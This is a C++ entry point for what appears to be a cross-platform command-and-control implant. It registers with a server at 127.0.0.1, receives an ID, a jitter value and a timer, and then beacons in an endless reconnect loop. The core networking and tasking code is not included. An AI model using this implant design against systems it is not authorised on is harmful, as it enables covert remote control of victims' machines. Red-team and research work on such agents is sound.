#include <iostream>
#include <string>
#include <tuple>
#include <stdexcept>
#include <curl/curl.h>

#include "Generic/config.h"
#include "Generic/httpRequests.h"

#ifdef __unix__
#include "Linux/generic.h"
#endif
#ifdef _WIN32
#include "Windows/generic.h"
#endif

int main() {
    std::string ID = "";
    int Jitter = -1;
    int Timer = -1;
    while (true) {
        try {
            if (ID != "" && Jitter != -1 && Timer != -1) {
                auto result = httpReconnect("127.0.0.1", ID, Jitter, Timer);
                if (std::get<0>(result) == -1) {
                    continue;
                }
            } else {
                auto result = httpConnection("127.0.0.1");
                if (std::get<0>(result) == -1) {
                    continue;
                }
                Timer = std::get<0>(result);
                ID = std::get<1>(result);
                Jitter = std::get<2>(result);
            }
            int err = beacon(URL, ID, Jitter, Timer);
            if (err == -1) {
                continue;
            }


        } catch (const std::exception& e) {
            std::cerr << "Failed to establish HTTP connection: " << e.what() << std::endl;
            return 1;
        }
    }
    return 0;
}